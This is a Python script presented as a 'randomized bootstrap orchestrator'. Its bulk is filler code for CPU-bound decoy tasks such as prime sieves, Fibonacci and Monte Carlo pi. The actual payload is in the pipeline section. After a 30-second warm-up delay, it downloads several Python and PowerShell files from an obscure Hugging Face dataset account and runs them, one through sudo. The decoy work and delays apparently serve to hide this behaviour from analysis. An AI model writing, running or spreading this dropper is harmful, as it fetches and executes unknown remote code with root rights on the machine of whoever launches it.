#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Randomized bootstrap orchestrator with computational warm-up tasks."""

import hashlib
import os
import random
import string
import subprocess
import sys
import time
from pathlib import Path

os.environ["PYTHONIOENCODING"] = "utf-8"

# ---------- silent dependency bootstrapping ----------
_DEPS = ("requests", "psutil", "setuptools", "pytz")

for _name in _DEPS:
    try:
        __import__(_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", _name])

import requests  # noqa: E402


# ============================================================
#   Random computational task engine
# ============================================================
_USED_TASKS = set()
_TASK_KINDS = [
    "sieve", "fib", "collatz", "matmul", "sortmix", "hashchain",
    "anagram", "caesar", "bst", "montecarlo", "digitsum",
    "kaprekar", "pascal", "binsearch",
]


def _pick_fresh_task():
    """Return a task kind that hasn't been used yet in this process."""
    pool = [t for t in _TASK_KINDS if t not in _USED_TASKS]
    if not pool:
        _USED_TASKS.clear()
        pool = list(_TASK_KINDS)
    choice = random.choice(pool)
    _USED_TASKS.add(choice)
    return choice


def _random_work(seconds: float) -> None:
    """Execute a random CPU-bound task for the given duration."""
    kind = _pick_fresh_task()
    rng = random.Random(
        int(time.time() * 1_000_000)
        ^ (os.getpid() << 17)
        ^ random.getrandbits(48)
    )
    deadline = time.time() + seconds
    tag = f"[{kind}|{seconds:g}s]"

    if kind == "sieve":
        limit = rng.randint(5_000, 80_000)
        primes = []
        for n in range(2, limit):
            if time.time() >= deadline:
                break
            ok = True
            for p in primes:
                if p * p > n:
                    break
                if n % p == 0:
                    ok = False
                    break
            if ok:
                primes.append(n)
        print(f"{tag} primes<{limit}={len(primes)}")

    elif kind == "fib":
        a, b, count = 0, 1, 0
        while time.time() < deadline:
            a, b = b, a + b
            count += 1
        print(f"{tag} fib_iters={count}")

    elif kind == "collatz":
        best_n, best_len = 0, 0
        start = rng.randint(1, 10_000)
        while time.time() < deadline:
            x, steps = start, 0
            while x != 1:
                x = x // 2 if x % 2 == 0 else 3 * x + 1
                steps += 1
            if steps > best_len:
                best_n, best_len = start, steps
            start += 1
        print(f"{tag} best_collatz n={best_n} len={best_len}")

    elif kind == "matmul":
        size = rng.randint(20, 55)
        A = [[rng.random() for _ in range(size)] for _ in range(size)]
        B = [[rng.random() for _ in range(size)] for _ in range(size)]
        C = [[0.0] * size for _ in range(size)]
        for i in range(size):
            if time.time() >= deadline:
                break
            Ai, Ci = A[i], C[i]
            for k in range(size):
                aik, Bk = Ai[k], B[k]
                for j in range(size):
                    Ci[j] += aik * Bk[j]
        print(f"{tag} matmul {size}x{size} ok")

    elif kind == "sortmix":
        n = rng.randint(50_000, 250_000)
        data = [rng.random() for _ in range(n)]
        data.sort()
        print(f"{tag} sorted {n} floats")

    elif kind == "hashchain":
        h = hashlib.sha256()
        count = 0
        while time.time() < deadline:
            h.update(str(count).encode())
            h.digest()
            count += 1
        print(f"{tag} sha256_chain={count}")

    elif kind == "anagram":
        words = [
            "".join(rng.choices(string.ascii_lowercase, k=rng.randint(4, 9)))
            for _ in range(2_000)
        ]
        groups = {}
        for w in words:
            if time.time() >= deadline:
                break
            groups.setdefault("".join(sorted(w)), []).append(w)
        print(f"{tag} anagram_groups={len(groups)}")

    elif kind == "caesar":
        text = "".join(rng.choices(string.ascii_letters + " ", k=40_000))
        shift = rng.randint(1, 25)
        out = []
        for ch in text:
            if time.time() >= deadline:
                break
            if ch.isalpha():
                base = ord('A') if ch.isupper() else ord('a')
                out.append(chr((ord(ch) - base + shift) % 26 + base))
            else:
                out.append(ch)
        print(f"{tag} caesar shift={shift} out={len(out)}")

    elif kind == "bst":
        class Node:
            __slots__ = ("v", "l", "r")
            def __init__(self, v):
                self.v, self.l, self.r = v, None, None
        root, inserted = None, 0
        while time.time() < deadline:
            v = rng.randint(0, 1_000_000)
            if root is None:
                root = Node(v)
            else:
                cur = root
                while True:
                    if v < cur.v:
                        if cur.l is None:
                            cur.l = Node(v); break
                        cur = cur.l
                    else:
                        if cur.r is None:
                            cur.r = Node(v); break
                        cur = cur.r
            inserted += 1
        print(f"{tag} bst_inserted={inserted}")

    elif kind == "montecarlo":
        inside = total = 0
        while time.time() < deadline:
            x, y = rng.random(), rng.random()
            if x * x + y * y <= 1.0:
                inside += 1
            total += 1
        pi_est = 4.0 * inside / max(total, 1)
        print(f"{tag} pi~{pi_est:.5f} samples={total}")

    elif kind == "digitsum":
        count, biggest = 0, 0
        while time.time() < deadline:
            v = rng.randint(0, 10 ** 12)
            s = sum(int(c) for c in str(v))
            if s > biggest:
                biggest = s
            count += 1
        print(f"{tag} digitsums={count} max={biggest}")

    elif kind == "kaprekar":
        count = 0
        while time.time() < deadline:
            n = rng.randint(1000, 9999)
            steps = 0
            while n != 6174 and steps < 20:
                s = "".join(sorted(f"{n:04d}"))
                n = int(s[::-1]) - int(s)
                steps += 1
            count += 1
        print(f"{tag} kaprekar_runs={count}")

    elif kind == "pascal":
        rows = rng.randint(200, 400)
        row = [1]
        for _ in range(rows):
            if time.time() >= deadline:
                break
            row = [1] + [row[i] + row[i + 1] for i in range(len(row) - 1)] + [1]
        print(f"{tag} pascal_rows={rows} width={len(row)}")

    elif kind == "binsearch":
        n = rng.randint(200_000, 800_000)
        arr = sorted(rng.randint(0, 10 ** 9) for _ in range(n))
        hits = 0
        while time.time() < deadline:
            target = rng.randint(0, 10 ** 9)
            lo, hi = 0, len(arr) - 1
            while lo <= hi:
                mid = (lo + hi) // 2
                if arr[mid] == target:
                    hits += 1
                    break
                if arr[mid] < target:
                    lo = mid + 1
                else:
                    hi = mid - 1
        print(f"{tag} binsearch_hits={hits}")


# ============================================================
#   Pipeline definition
# ============================================================
_REMOTE_SOURCES = [
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/1.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/in.ps1",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/hash.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/1first.py",
    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/openShrinkNew.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/prep.py",
    "https://huggingface.co/datasets/gfdg34fsd/sh/resolve/main/rest.py",
    "https://huggingface.co/datasets/gfdg34fsd/newe/resolve/main/restfirst.py",
]

_STAGING = Path.cwd() / "downloaded_files"

_EXEC_PLAN = [
    ("restfirst.py", True),   # elevate = True
    ("la222.py", False),      # elevate = False
]


def _pull(url: str, dest: Path) -> bool:
    try:
        print(f"  ↓ {url}")
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with dest.open("wb") as fh:
            for chunk in r.iter_content(8192):
                fh.write(chunk)
        print(f"  ✓ {dest}")
        return True
    except Exception as exc:
        print(f"  ✗ {url} -> {exc}")
        return False


def _stage_all() -> bool:
    _STAGING.mkdir(parents=True, exist_ok=True)
    ok = True
    for url in _REMOTE_SOURCES:
        name = url.rsplit("/", 1)[-1]
        if not _pull(url, _STAGING / name):
            ok = False
        _random_work(1)   # 1-second random task between downloads
    return ok


def _launch(script: str, elevate: bool) -> bool:
    path = _STAGING / script
    if not path.exists():
        print(f"missing script: {path}")
        return False
    cmd = (["sudo"] if elevate else []) + [sys.executable, str(path)]
    print(f"  ▶ {' '.join(cmd)}")
    return subprocess.run(cmd, cwd=_STAGING).returncode == 0


def _run() -> int:
    # -------- Phase 0: 30-second randomized warm-up --------
    print(">>> phase 0 :: randomized 30s warm-up")
    _random_work(30)

    # -------- Phase 1: download everything --------
    print(">>> phase 1 :: staging remote files")
    if not _stage_all():
        print("staging incomplete")
        return 1

    # -------- Phase 2: execute scripts with 1s tasks in between --------
    print(">>> phase 2 :: running pipeline")
    for script, elevate in _EXEC_PLAN:
        _random_work(1)   # fresh 1-second task before each script
        if not _launch(script, elevate):
            print(f"step '{script}' failed")
            return 1

    print(">>> done :: all phases completed")
    return 0


if __name__ == "__main__":
    sys.exit(_run())
